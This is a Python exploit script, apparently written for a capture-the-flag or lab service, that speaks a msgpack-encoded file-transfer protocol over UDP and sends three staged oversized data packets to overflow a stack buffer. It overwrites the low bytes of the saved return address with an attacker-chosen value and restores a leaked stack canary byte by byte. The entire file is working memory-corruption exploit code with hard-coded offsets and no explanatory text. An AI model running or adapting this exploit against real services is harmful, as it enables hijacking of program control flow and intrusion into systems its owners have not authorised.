#!/usr/bin/env python3

import argparse
import re
import socket
import struct
import time
import zlib

import msgpack


def get_udp_port(host, tcp_port):
    io = socket.create_connection((host, tcp_port), timeout=5)
    banner = io.recv(128)
    m = re.search(rb"(\d+)", banner)
    if not m:
        raise RuntimeError(f"bad banner: {banner!r}")
    return io, int(m.group(1))


def make_udp(io=None):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if io is None:
        s.bind(("0.0.0.0", 0))
    else:
        s.bind(("0.0.0.0", io.getsockname()[1]))
    s.settimeout(5)
    return s


def recv_obj(sock):
    data, _ = sock.recvfrom(65535)
    return msgpack.unpackb(data, raw=False, strict_map_key=False)


def mp_uint(x):
    return msgpack.packb(x, use_bin_type=True)


def mp_str_raw(data):
    n = len(data)
    if n <= 31:
        return bytes([0xA0 | n]) + data
    if n <= 0xFF:
        return b"\xD9" + bytes([n]) + data
    if n <= 0xFFFF:
        return b"\xDA" + struct.pack(">H", n) + data
    return b"\xDB" + struct.pack(">I", n) + data


def build_data_rawstr(blockno, crc, data):
    return b"\x94" + mp_uint(3) + mp_uint(blockno) + mp_uint(crc) + mp_str_raw(data)


def build_wrq(blksize):
    return [2, "x", "octet", {"blksize": blksize}, 0]


def crc_for_rawstr(data):
    rendered = data[:-1]
    return zlib.crc32(rendered) & 0xFFFFFFFF


def open_session(host, tcp_port=None, udp_port=None):
    if udp_port is None:
        io, u = get_udp_port(host, tcp_port)
        sock = make_udp(io)
        return io, sock, u
    sock = make_udp(None)
    return None, sock, udp_port


def do_stage(host, tcp_port, udp_port, blksize, data):
    io, sock, port = open_session(host, tcp_port, udp_port)
    sock.sendto(msgpack.packb(build_wrq(blksize), use_bin_type=True), (host, port))
    wrq = recv_obj(sock)
    crc = crc_for_rawstr(data)
    pkt = build_data_rawstr(1, crc, data)
    sock.sendto(pkt, (host, port))
    try:
        resp = recv_obj(sock)
    except Exception as e:
        resp = f"ERR:{e!r}"
    if io is not None:
        io.close()
    sock.close()
    return port, wrq, crc, resp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--tcp-port", type=int, default=10309)
    ap.add_argument("--udp-port", type=int)
    ap.add_argument("--blksize", type=int, default=2048)
    ap.add_argument("--canary", required=True, help="hex, e.g. 2d4dfd236ddbb000")
    ap.add_argument("--rip-low6", default="414141414141", help="hex low 6 bytes")
    ap.add_argument("--wait", type=int, default=65)
    args = ap.parse_args()

    canary = int(args.canary, 16).to_bytes(8, "little")
    rip_low6 = bytes.fromhex(args.rip_low6)
    if len(rip_low6) != 6:
        raise SystemExit("--rip-low6 must be 6 bytes hex")

    # Stage 1: overwrite low 6 bytes of saved RIP; NUL lands on RIP byte 6.
    s1 = bytearray(b"A" * 0x232)
    s1[0x22B:0x231] = rip_low6

    # Stage 2: restore canary bytes 1..7 without touching RIP.
    s2 = bytearray(b"B" * 0x214)
    s2[0x20B] = 0x42
    s2[0x20C:0x213] = canary[1:]

    # Stage 3: place NUL back on canary byte 0.
    s3 = bytearray(b"C" * 0x20C)

    for idx, payload in enumerate((s1, s2, s3), 1):
        port, wrq, crc, resp = do_stage(
            args.host, args.tcp_port, args.udp_port, args.blksize, bytes(payload)
        )
        print(f"stage{idx} udp={port} wrq={wrq!r} crc=0x{crc:08x} resp={resp!r}", flush=True)

    print(f"waiting {args.wait}s for alarm/select return", flush=True)
    time.sleep(args.wait)


if __name__ == "__main__":
    main()
